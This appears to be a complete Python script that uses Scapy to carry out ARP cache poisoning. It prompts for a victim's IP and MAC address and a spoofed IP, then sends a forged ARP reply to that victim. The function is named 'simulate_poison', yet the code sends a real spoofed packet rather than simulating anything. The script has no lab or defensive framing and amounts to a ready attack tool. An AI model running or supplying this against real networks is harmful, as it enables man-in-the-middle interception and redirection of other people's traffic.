from scapy.all import ARP, send


def simulate_poison(victim_ip: str, victim_mac: str, fake_ip: str):
    packet = ARP(
        op=2,  # ARP reply
        psrc=fake_ip,
        pdst=victim_ip,
        hwdst=victim_mac,
    )
    send(packet, verbose=False)


if __name__ == "__main__":
    victim_ip = input("Victim IP: ")
    victim_mac = input("Victim MAC: ")
    fake_ip = input("Fake IP: ")
    simulate_poison(victim_ip, victim_mac, fake_ip)
